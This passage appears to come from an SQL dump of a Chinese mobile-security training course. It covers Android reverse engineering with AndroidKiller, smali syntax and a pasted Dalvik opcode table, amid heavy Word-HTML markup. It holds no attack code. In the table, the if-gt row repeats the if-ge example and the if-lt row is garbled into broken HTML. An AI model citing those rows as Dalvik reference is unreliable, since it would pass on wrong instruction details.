src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image007.png\" o:title=\"\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.6.png\"><br></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_5\" o:spid=\"_x0000_i1029\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:677.25pt;\r\n height:546pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image009.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\EX1I1DRL948D)JQJI~F2L~4.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image010.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></p><p><v:shape id=\"图片_x0020_6\" o:spid=\"_x0000_i1028\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:399pt;\r\n height:189.75pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image011.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\TRQ@TX4MJWS%7b%5dWTC%5dW%7b5E7E.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image012.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></p><p>二.DDMS的使用查看Logcat</p><p><v:shape id=\"图片_x0020_7\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:759pt;\r\n height:538.5pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\I1B4%25RVFTOV)15D21QR%25$%7dY.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image014.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.7.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></p><p><v:shape o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:759pt;\r\n height:538.5pt;visibility:visible;mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image013.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\I1B4%25RVFTOV)15D21QR%25$%7dY.png\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.8.png\"><br></v:imagedata></v:shape></p><p>手机连接PC,打开调试，<v:shape id=\"图片_x0020_9\" o:spid=\"_x0000_i1025\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:758.25pt;\r\n height:533.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image017.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\EJ7JVW%25QGOSB21NXMBN0%7dW0.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image018.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%937.9.png\" style=\"line-height: 1; max-width: 100%;\"></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:27:17',1,NULL,'<p>查看课程报告</p>',0,''),(96,'移动安全基础课程训练八','移动安全基础课程训练逆向篇','<p>Android逆向三</p><p>一．Smali代码的静态分析</p><p>&nbsp;&nbsp; 1.使用AndroidKiller</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 载入apk后左侧可以看到四大组件的情况和工程信息。</p><p><v:shapetype id=\"_x0000_t75\" coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\">\r\n \r\n \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n  \r\n \r\n \r\n \r\n<v:shape id=\"图片_x0020_1\" o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:220.5pt;height:420.75pt;visibility:visible;\r\n mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\V%7d9WT9~@T9WVN_2)%60OUIG3W.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image002.jpg\" alt=\"IMG_256\"><img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%938.1.png\" style=\"line-height: 1; max-width: 100%;\"></v:imagedata></v:shape></v:shapetype></p><p><v:shapetype coordsize=\"21600,21600\" o:spt=\"75\" o:preferrelative=\"t\" path=\"m@4@5l@4@11@9@11@9@5xe\" filled=\"f\" stroked=\"f\"><v:shape o:spid=\"_x0000_i1027\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:220.5pt;height:420.75pt;visibility:visible;\r\n mso-wrap-style:square\"><v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image001.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\V%7d9WT9~@T9WVN_2)%60OUIG3W.png\"><img style=\"max-width:100%;\" src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%938.2.png\"><br></v:imagedata></v:shape></v:shapetype></p><p><v:shape id=\"图片_x0020_2\" o:spid=\"_x0000_i1026\" type=\"#_x0000_t75\" alt=\"IMG_256\" style=\"width:673.5pt;\r\n height:278.25pt;visibility:visible;mso-wrap-style:square\">\r\n <v:imagedata src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image003.png\" o:href=\"file:///C:\\Users\\user\\AppData\\Roaming\\Tencent\\Users\\2397159279\\QQ\\WinTemp\\RichOle\\E9GYS(KRBKFL4HW~ANA_416.png\">\r\n<img src=\"file:///C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\msohtmlclip1\\01\\clip_image004.jpg\" alt=\"IMG_256\"></v:imagedata></v:shape></p><p>默认是查看smali层代码，可以用集成的jd-gui\r\n打开</p><p>进去后Ctrl+F可以搜索关键函数名和字串</p><p>&nbsp;<img src=\"http://oda8mr8yr.bkt.clouddn.com/%E5%AE%89%E5%8D%938.3.png\" style=\"line-height: 1; max-width: 100%;\"></p><p>左侧工程搜索可以对关键的字符串或者打印信息进行搜索，找到关键函数位置。</p><p><br></p>',1,'http://oda8mr8yr.bkt.clouddn.com/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8.jpeg','index.alauda.cn/dubuqingfeng/docker-web-game:latest','2016-10-31 11:27:36',1,NULL,'<p>二．Smali常见语法介绍</p><p>V&nbsp;&nbsp;空类型---仅仅可以用来作为返回类型 &nbsp;&nbsp;&nbsp; Z&nbsp;&nbsp;Boolean&nbsp;布尔型 &nbsp;&nbsp;&nbsp; B&nbsp;&nbsp;Byte字节型 &nbsp;&nbsp;&nbsp; S&nbsp;&nbsp;Short短整型（16位） &nbsp;&nbsp;&nbsp; C&nbsp;&nbsp;Char字符型 &nbsp;&nbsp;&nbsp; I&nbsp;&nbsp;Int&nbsp;整形 &nbsp;&nbsp;&nbsp; J&nbsp;&nbsp;long&nbsp;(64&nbsp;bits)长整型（64位） &nbsp;&nbsp;&nbsp; F&nbsp;&nbsp;Float浮点型 &nbsp;&nbsp;&nbsp; D&nbsp;&nbsp;double&nbsp;(64&nbsp;bits)双精度型（64位）</p><p>invoke-direct{p0}, Landroid/support/v7/app/AppCompatActivity;-&gt;&lt;init&gt;()V</p><p>直接调用带参数的方法名</p><p>Invoke-direct{参数},方法名</p><p>move-result-object v1</p><p>Move-result-object vx</p><p>移动上一个方法调用的对象到vx寄存器</p><p>invoke-virtual{p0,v2}, Lcom/example/user/myapplication/MainActivity;-&gt;findViewById(I)Landroid/view/View;</p><p>Invoke-virtual{参数},方法名</p><p>调用带参数的虚方法。</p><p>\"if-eq vA, vB, :cond_**\"&nbsp; &nbsp;如果vA等于vB则跳转到:cond_** \"if-ne&nbsp;vA, vB, :cond_**\"&nbsp; &nbsp;如果vA不等于vB则跳转到:cond_** \"if-lt&nbsp;vA, vB, :cond_**\"&nbsp; &nbsp;&nbsp;如果vA小于vB则跳转到:cond_** \"if-ge&nbsp;vA, vB, :cond_**\"&nbsp; &nbsp;如果vA大于等于vB则跳转到:cond_** \"if-gt&nbsp;vA, vB, :cond_**\"&nbsp; &nbsp;如果vA大于vB则跳转到:cond_** \"if-le&nbsp;vA, vB, :cond_**\"&nbsp; &nbsp;&nbsp;如果vA小于等于vB则跳转到:cond_** \"if-eqz vA, :cond_**\"&nbsp; &nbsp;如果vA等于0则跳转到:cond_** \"if-nez&nbsp;vA, :cond_**\"&nbsp; &nbsp;如果vA不等于0则跳转到:cond_** \"if-ltz&nbsp;vA, :cond_**\"&nbsp; &nbsp;&nbsp;如果vA小于0则跳转到:cond_** \"if-gez&nbsp;vA, :cond_**\"&nbsp; &nbsp;如果vA大于等于0则跳转到:cond_** \"if-gtz&nbsp;vA, :cond_**\"&nbsp; &nbsp;如果vA大于0则跳转到:cond_** \"if-lez&nbsp;vA, :cond_**\"&nbsp; &nbsp;&nbsp;如果vA小于等于0则跳转到:cond_**</p><p>&nbsp;</p><p>具体的可以参考这里：</p><table><tbody><tr><td><p>Opcode (hex)<o:p></o:p></p></td><td><p>Opcode name<o:p></o:p></p></td><td><p>Explanation<o:p></o:p></p></td><td><p>Example<o:p></o:p></p></td></tr><tr><td><p>00<o:p></o:p></p></td><td><p>nop<o:p></o:p></p></td><td><p>No operation<o:p></o:p></p></td><td><p>0000 - nop<o:p></o:p></p></td></tr><tr><td><p>01<o:p></o:p></p></td><td><p>move vx,vy<o:p></o:p></p></td><td><p>Moves the content of vy into vx. Both registers must be in the first 256 register range.<o:p></o:p></p></td><td><p>0110 - move v0, v1<br>Moves v1 into v0.<o:p></o:p></p></td></tr><tr><td><p>02<o:p></o:p></p></td><td><p>move/from16 vx,vy<o:p></o:p></p></td><td><p>Moves the content of vy into vx. vy may be in the 64k register range while vx is one of the first 256 registers.<o:p></o:p></p></td><td><p>0200 1900 - move/from16 v0, v25<br>Moves v25 into v0.<o:p></o:p></p></td></tr><tr><td><p>03<o:p></o:p></p></td><td><p>move/16<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>04<o:p></o:p></p></td><td><p>move-wide<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>05<o:p></o:p></p></td><td><p>move-wide/from16 vx,vy<o:p></o:p></p></td><td><p>Moves a long/double value from vy to vx. vy may be in the 64k register range while wx is one of the first 256 registers.<o:p></o:p></p></td><td><p>0516 0000 - move-wide/from16 v22, v0<br>Moves v0 into v22.<o:p></o:p></p></td></tr><tr><td><p>06<o:p></o:p></p></td><td><p>move-wide/16<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>07<o:p></o:p></p></td><td><p>move-object vx,vy<o:p></o:p></p></td><td><p>Moves the object reference from vy to vx.<o:p></o:p></p></td><td><p>0781 - move-object v1, v8<br>Moves the object reference in v8 to v1.<o:p></o:p></p></td></tr><tr><td><p>08<o:p></o:p></p></td><td><p>move-object/from16 vx,vy<o:p></o:p></p></td><td><p>Moves the object reference from vy to vx, vy can address 64k registers and vx can address 256 registers.<o:p></o:p></p></td><td><p>0801 1500 - move-object/from16 v1, v21<br>Move the object reference in v21 to v1.<o:p></o:p></p></td></tr><tr><td><p>09<o:p></o:p></p></td><td><p>move-object/16<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>0A<o:p></o:p></p></td><td><p>move-result vx<o:p></o:p></p></td><td><p>Move the result value of the previous method invocation into vx.<o:p></o:p></p></td><td><p>0A00 - move-result v0<br>Move the return value of a previous method invocation into v0.<o:p></o:p></p></td></tr><tr><td><p>0B<o:p></o:p></p></td><td><p>move-result-wide vx<o:p></o:p></p></td><td><p>Move the long/double result value of the previous method invocation into vx,vx+1.<o:p></o:p></p></td><td><p>0B02 - move-result-wide v2<br>Move the long/double result value of the previous method invocation into v2,v3.<o:p></o:p></p></td></tr><tr><td><p>0C<o:p></o:p></p></td><td><p>move-result-object vx<o:p></o:p></p></td><td><p>Move the result object reference of the previous method invocation into vx.<o:p></o:p></p></td><td><p>0C00 - move-result-object v0<o:p></o:p></p></td></tr><tr><td><p>0D<o:p></o:p></p></td><td><p>move-exception vx<o:p></o:p></p></td><td><p>Move the exception object reference thrown during a method invocation into vx.<o:p></o:p></p></td><td><p>0D19 - move-exception v25<o:p></o:p></p></td></tr><tr><td><p>0E<o:p></o:p></p></td><td><p>return-void<o:p></o:p></p></td><td><p>Return without a return value<o:p></o:p></p></td><td><p>0E00 - return-void<o:p></o:p></p></td></tr><tr><td><p>0F<o:p></o:p></p></td><td><p>return vx<o:p></o:p></p></td><td><p>Return with vx return value<o:p></o:p></p></td><td><p>0F00 - return v0<br>Returns with return value in v0.<o:p></o:p></p></td></tr><tr><td><p>10<o:p></o:p></p></td><td><p>return-wide vx<o:p></o:p></p></td><td><p>Return with double/long result in vx,vx+1.<o:p></o:p></p></td><td><p>1000 - return-wide v0<br>Returns with a double/long value in v0,v1.<o:p></o:p></p></td></tr><tr><td><p>11<o:p></o:p></p></td><td><p>return-object vx<o:p></o:p></p></td><td><p>Return with vx object reference value.<o:p></o:p></p></td><td><p>1100 - return-object v0<br>Returns with object reference value in v0<o:p></o:p></p></td></tr><tr><td><p>12<o:p></o:p></p></td><td><p>const/4 vx,lit4<o:p></o:p></p></td><td><p>Puts the 4 bit constant into vx<o:p></o:p></p></td><td><p>1221 - const/4 v1, #int2<br>Moves literal 2 into v1. The destination register is in the lower 4 bit in the second byte, the literal 2 is in the higher 4 bit.<o:p></o:p></p></td></tr><tr><td><p>13<o:p></o:p></p></td><td><p>const/16 vx,lit16<o:p></o:p></p></td><td><p>Puts the 16 bit constant into vx<o:p></o:p></p></td><td><p>1300 0A00 - const/16 v0, #int 10<br>Puts the literal constant of 10 into v0.<o:p></o:p></p></td></tr><tr><td><p>14<o:p></o:p></p></td><td><p>const vx, lit32<o:p></o:p></p></td><td><p>Puts the integer constant into vx<o:p></o:p></p></td><td><p>1400 4E61 BC00 - const v0, #12345678 // #00BC614E<br>Moves literal 12345678 into v0.<o:p></o:p></p></td></tr><tr><td><p>15<o:p></o:p></p></td><td><p>const/high16 v0, lit16<o:p></o:p></p></td><td><p>Puts the 16 bit constant into the topmost bits of the register. Used to initialize float values.<o:p></o:p></p></td><td><p>1500 2041 - const/high16 v0, #float 10.0 // #41200000<br>Moves the floating literal of 10.0 into v0. The 16 bit literal in the instruction carries the top 16 bits of the floating point number.<o:p></o:p></p></td></tr><tr><td><p>16<o:p></o:p></p></td><td><p>const-wide/16 vx, lit16<o:p></o:p></p></td><td><p>Puts the integer constant into vx and vx+1 registers, expanding the integer constant into a long constant..<o:p></o:p></p></td><td><p>1600 0A00 - const-wide/16 v0, #long 10<br>Moves literal 10 into v0 and v1 registers.<o:p></o:p></p></td></tr><tr><td><p>17<o:p></o:p></p></td><td><p>const-wide/32 vx, lit32<o:p></o:p></p></td><td><p>Puts the 32 bit constant into vx and vx+1 registers, expanding the integer constant into a long constant.<o:p></o:p></p></td><td><p>1702 4e61 bc00 - const-wide/32 v2, #long 12345678 // #00bc614e<br>Puts #12345678 into v2 and v3 registers.<o:p></o:p></p></td></tr><tr><td><p>18<o:p></o:p></p></td><td><p>const-wide vx, lit64<o:p></o:p></p></td><td><p>Puts the 64 bit constant into vx and vx+1 registers.<o:p></o:p></p></td><td><p>1802 874b 6b5d 54dc 2b00- const-wide v2, #long 12345678901234567 // #002bdc545d6b4b87<br>Puts #12345678901234567 into v2 and v3 registers.<o:p></o:p></p></td></tr><tr><td><p>19<o:p></o:p></p></td><td><p>const-wide/high16 vx,lit16<o:p></o:p></p></td><td><p>Puts the 16 bit constant into the highest 16 bit of vx and vx+1 registers. Used to initialize double values.<o:p></o:p></p></td><td><p>1900 2440 - const-wide/high16 v0, #double 10.0 // #402400000<br>Puts the double constant of 10.0 into v0 register.<o:p></o:p></p></td></tr><tr><td><p>1A<o:p></o:p></p></td><td><p>const-string vx,string_id<o:p></o:p></p></td><td><p>Puts reference to a string constant identified by string_id into vx.<o:p></o:p></p></td><td><p>1A08 0000 - const-string v8, \"\" // string@0000<br>Puts reference to string@0000 (entry #0 in the string table) into v8.<o:p></o:p></p></td></tr><tr><td><p>1B<o:p></o:p></p></td><td><p>const-string-jumbo<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>1C<o:p></o:p></p></td><td><p>const-class vx,type_id<o:p></o:p></p></td><td><p>Moves the class object of a class identified by type_id (e.g. Object.class) into vx.<o:p></o:p></p></td><td><p>1C00 0100 - const-class v0, Test3 // type@0001<br>Moves reference to Test3.class (entry#1 in the type id table) into<o:p></o:p></p></td></tr><tr><td><p>1D<o:p></o:p></p></td><td><p>monitor-enter vx<o:p></o:p></p></td><td><p>Obtains the monitor of the object referenced by vx.<o:p></o:p></p></td><td><p>1D03 - monitor-enter v3<br>Obtains the monitor of the object referenced by v3.<o:p></o:p></p></td></tr><tr><td><p>1E<o:p></o:p></p></td><td><p>monitor-exit<o:p></o:p></p></td><td><p>Releases the monitor of the object referenced by vx.<o:p></o:p></p></td><td><p>1E03 - monitor-exit v3<br>Releases the monitor of the object referenced by v3.<o:p></o:p></p></td></tr><tr><td><p>1F<o:p></o:p></p></td><td><p>check-cast vx, type_id<o:p></o:p></p></td><td><p>Checks whether the object reference in vx can be cast to an instance of a class referenced by type_id. Throws ClassCastException if the cast is not possible, continues execution otherwise.<o:p></o:p></p></td><td><p>1F04 0100 - check-cast v4, Test3 // type@0001<br>Checks whether the object reference in v4 can be cast to type@0001 (entry #1 in the type id table)<o:p></o:p></p></td></tr><tr><td><p>20<o:p></o:p></p></td><td><p>instance-of vx,vy,type_id<o:p></o:p></p></td><td><p>Checks whether vy is instance of a class identified by type_id. Sets vx non-zero if it is, 0 otherwise.<o:p></o:p></p></td><td><p>2040 0100 - instance-of v0, v4, Test3 // type@0001<br>Checks whether the object reference in v4 is an instance of type@0001 (entry #1 in the type id table). Sets v0 to non-zero if v4 is instance of Test3, 0 otherwise.<o:p></o:p></p></td></tr><tr><td><p>21<o:p></o:p></p></td><td><p>array-length vx,vy<o:p></o:p></p></td><td><p>Calculates the number of elements of the array referenced by vy and puts the length value into vx.<o:p></o:p></p></td><td><p>2111 - array-length v1, v1<br>Calculates the number of elements of the array referenced by v1 and puts the result into v1.<o:p></o:p></p></td></tr><tr><td><p>22<o:p></o:p></p></td><td><p>new-instance vx,type<o:p></o:p></p></td><td><p>Instantiates an object type and puts the reference of the newly created instance into vx.<o:p></o:p></p></td><td><p>2200 1500 - new-instance v0, java.io.FileInputStream // type@0015<br>Instantiates type@0015 (entry #15H in the type table) and puts its reference into v0.<o:p></o:p></p></td></tr><tr><td><p>23<o:p></o:p></p></td><td><p>new-array vx,vy,type_id<o:p></o:p></p></td><td><p>Generates a new array of type_id type and vy element size and puts the reference to the array into vx.<o:p></o:p></p></td><td><p>2312 2500 - new-array v2, v1, char[] // type@0025<br>Generates a new array of type@0025 type and v1 size and puts the reference to the new array into v2.<o:p></o:p></p></td></tr><tr><td><p>24<o:p></o:p></p></td><td><p>filled-new-array {parameters},type_id<o:p></o:p></p></td><td><p>Generates a new array of type_id and fills it with the parameters<sup>5</sup>. Reference to the newly generated array can be obtained by a move-result-object instruction, immediately following the filled-new-array instruction.<o:p></o:p></p></td><td><p>2420 530D 0000 - filled-new-array {v0,v0},[I // type@0D53<br>Generates a new array of type@0D53. The array\'s size will be 2 and both elements will be filled with the contents of v0 register.<o:p></o:p></p></td></tr><tr><td><p>25<o:p></o:p></p></td><td><p>filled-new-array-range {vx..vy},type_id<o:p></o:p></p></td><td><p>Generates a new array of type_id and fills it with a range of parameters. Reference to the newly generated array can be obtained by a move-result-object instruction, immediately following the filled-new-array instruction.<o:p></o:p></p></td><td><p>2503 0600 1300 - filled-new-array/range {v19..v21}, [B // type@0006<br>Generates a new array of type@0D53. The array\'s size will be 3 and the elements will be filled using the v19,v20 and v21 registers<sup>4</sup>.<o:p></o:p></p></td></tr><tr><td><p>26<o:p></o:p></p></td><td><p>fill-array-data vx,array_data_offset<o:p></o:p></p></td><td><p>Fills the array referenced by vx with the static data. The location of the static data is the sum of&nbsp; the position of the current instruction and the offset<o:p></o:p></p></td><td><p>2606 2500 0000 - fill-array-data v6, 00e6 // +0025<br>Fills the array referenced by v0 with the static data at current instruction+25H words location. The offset is expressed as a 32-bit number. The static data is stored in the following format:<br>0003 // Table type: static array data<br>0400 // Byte per array element (in this case, 4 byte integers)<br>0300 0000 // Number of elements in the table<br>0100 0000&nbsp; // Element #0: integer 1<br>0200 0000 // Element #1: integer 2<br>0300 0000 // Element #2: integer3<o:p></o:p></p></td></tr><tr><td><p>27<o:p></o:p></p></td><td><p>throw vx<o:p></o:p></p></td><td><p>Throws an exception object. The reference of the exception object is in vx.<o:p></o:p></p></td><td><p>2700 - throw v0<br>Throws an exception. The exception object reference is in v0.<o:p></o:p></p></td></tr><tr><td><p>28<o:p></o:p></p></td><td><p>goto target<o:p></o:p></p></td><td><p>Unconditional jump by short offset<sup>2</sup>.<o:p></o:p></p></td><td><p>28F0 - goto 0005 // -0010<br>Jumps to current position-16 words (hex 10). 0005 is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>29<o:p></o:p></p></td><td><p>goto/16 target<o:p></o:p></p></td><td><p>Unconditional jump by 16 bit offset<sup>2</sup>.<o:p></o:p></p></td><td><p>2900 0FFE - goto/16 002f // -01f1<br>Jumps to the current position-1F1H words. 002F is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>2A<o:p></o:p></p></td><td><p>goto/32 target<o:p></o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td><td><p><o:p>&nbsp;</o:p></p></td></tr><tr><td><p>2B<o:p></o:p></p></td><td><p>packed-switch vx,table<o:p></o:p></p></td><td><p>Implements a switch statement where the case constants are close to each other. The instruction uses an index table. vx indexes into this table to find the offset of the instruction for a particular case. If vx falls out of the index table, the execution continues on the next instruction (default case).<o:p></o:p></p></td><td><p>2B02 0C00 0000 - packed-switch v2, 000c // +000c<br>Execute a packed switch according to the switch argument in v2. The position of the index table is at current instruction+0CH words. The table looks like the following:<br>0001 // Table type: packed switch table<br>0300 // number of elements<br>0000 0000 // element base<br>0500 0000&nbsp; 0: 00000005 // case 0: +00000005<br>0700 0000&nbsp; 1: 00000007 // case 1: +00000007<br>0900 0000&nbsp; 2: 00000009 // case 2: +00000009<o:p></o:p></p></td></tr><tr><td><p>2C<o:p></o:p></p></td><td><p>sparse-switch vx,table<o:p></o:p></p></td><td><p>Implements a switch statement with sparse case table. The instruction uses a lookup table with case constants and offsets for each case constant. If there is no match in the table, execution continues on the next instruction (default case).<o:p></o:p></p></td><td><p>2C02 0c00 0000 - sparse-switch v2, 000c // +000c<br>Execute a sparse switch according to the switch argument in v2. The position of the lookup table is at current instruction+0CH words. The table looks like the following.<br>0002 // Table type: sparse switch table<br>0300 // number of elements<br>9cff ffff // first case: -100<br>fa00 0000 // second case constant: 250<br>e803 0000 // third case constant: 1000<br>0500 0000 // offset for the first case constant: +5<br>0700 0000 // offset for the second case constant: +7<br>0900 0000 // offset for the third case constant: +9<o:p></o:p></p></td></tr><tr><td><p>2D<o:p></o:p></p></td><td><p>cmpl-float<o:p></o:p></p></td><td><p>Compares the float values in vy and vz and sets the integer value in vx accordingly<sup>3</sup><o:p></o:p></p></td><td><p>2D00 0607 - cmpl-float v0, v6, v7<br>Compares the float values in v6 and v7 then sets v0 accordingly. NaN bias is less-than, the instruction will return -1 if any of the parameters is NaN.<o:p></o:p></p></td></tr><tr><td><p>2E<o:p></o:p></p></td><td><p>cmpg-float vx, vy, vz<o:p></o:p></p></td><td><p>Compares the float values in vy and vz and sets the integer value in vx accordingly<sup>3</sup>.<o:p></o:p></p></td><td><p>2E00 0607 - cmpg-float v0, v6, v7<br>Compares the float values in v6 and v7 then sets v0 accordingly. NaN bias is greater-than, the instruction will return 1 if any of the parameters is NaN.<o:p></o:p></p></td></tr><tr><td><p>2F<o:p></o:p></p></td><td><p>cmpl-double vx,vy,vz<o:p></o:p></p></td><td><p>Compares the double values in vy and vz<sup>2</sup>&nbsp;and sets the integer value in vx accordingly<sup>3</sup>.<o:p></o:p></p></td><td><p>2F19 0608 - cmpl-double v25, v6, v8<br>Compares the double values in v6,v7 and v8,v9 and sets v25 accordingly. NaN bias is less-than, the instruction will return -1 if any of the parameters is NaN.<o:p></o:p></p></td></tr><tr><td><p>30<o:p></o:p></p></td><td><p>cmpg-double vx, vy, vz<o:p></o:p></p></td><td><p>Compares the double values in vy and vz<sup>2</sup>&nbsp;and sets the integer value in vx accordingly<sup>3</sup>.<o:p></o:p></p></td><td><p>3000 080A - cmpg-double v0, v8, v10<br>Compares the double values in v8,v9 and v10,v11 then sets v0 accordingly. NaN bias is greater-than, the instruction will return 1 if any of the parameters is NaN.<o:p></o:p></p></td></tr><tr><td><p>31<o:p></o:p></p></td><td><p>cmp-long vx, vy, vz<o:p></o:p></p></td><td><p>Compares the long values in vy and vz and sets the integer value in vx accordingly<sup>3</sup>.<o:p></o:p></p></td><td><p>3100 0204 - cmp-long v0, v2, v4<br>Compares the long values in v2 and v4 then sets v0 accordingly.<o:p></o:p></p></td></tr><tr><td><p>32<o:p></o:p></p></td><td><p>if-eq vx,vy,target<o:p></o:p></p></td><td><p>Jumps to target if vx==vy<sup>2</sup>. vx and vy are integer values.<o:p></o:p></p></td><td><p>32b3 6600 - if-eq v3, v11, 0080 // +0066<br>Jumps to the current position+66H words if v3==v11. 0080 is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>33<o:p></o:p></p></td><td><p>if-ne vx,vy,target<o:p></o:p></p></td><td><p>Jumps to target if vx!=vy<sup>2</sup>. vx and vy are integer values.<o:p></o:p></p></td><td><p>33A3 1000 - if-ne v3, v10, 002c // +0010<br>Jumps to the current position+10H words if v3!=v10. 002c is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>34<o:p></o:p></p></td><td><p>if-lt vx,vy,target<o:p></o:p></p></td><td><p>Jumps to target is vx&lt;vy<sup>2. vx and vy are integer values.</sup><o:p></o:p></p></td><td><p>3432 CBFF - if-lt v2, v3, 0023 // -0035<br>Jumps to the current position-35H words if v2&lt;=\"\" instruction.=\"\" target=\"\" the=\"\" of=\"\" label=\"\" is=\"\" 0023=\"\"&gt;<o:p></o:p></p></td></tr><tr><td><p>35<o:p></o:p></p></td><td><p>if-ge vx, vy,target<o:p></o:p></p></td><td><p>Jumps to target if vx&gt;=vy<sup>2</sup>. vx and vy are integer values.<o:p></o:p></p></td><td><p>3510 1B00 - if-ge v0, v1, 002b // +001b<br>Jumps to the current position+1BH words if v0&gt;=v1. 002b is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>36<o:p></o:p></p></td><td><p>if-gt vx,vy,target<o:p></o:p></p></td><td><p>Jumps to target if vx&gt;vy<sup>2</sup>. vx and vy are integer values.<o:p></o:p></p></td><td><p>3610 1B00 - if-ge v0, v1, 002b // +001b<br>Jumps to the current position+1BH words if v0&gt;v1. 002b is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>37<o:p></o:p></p></td><td><p>if-le vx,vy,target<o:p></o:p></p></td><td><p>Jumps to target if vx&lt;=vy<sup>2</sup>. vx and vy are integer values.<o:p></o:p></p></td><td><p>3756 0B00 - if-le v6, v5, 0144 // +000b<br>Jumps to the current position+0BH words if v6&lt;=v5. 0144 is the label of the target instruction.<o:p></o:p></p></td></tr><tr><td><p>38<o:p></o:p></p></td><td><p>if-eqz vx,target<o:p></o:p></p></td><td><p>Jumps to target if vx==0<sup>2</sup>. vx is an integer 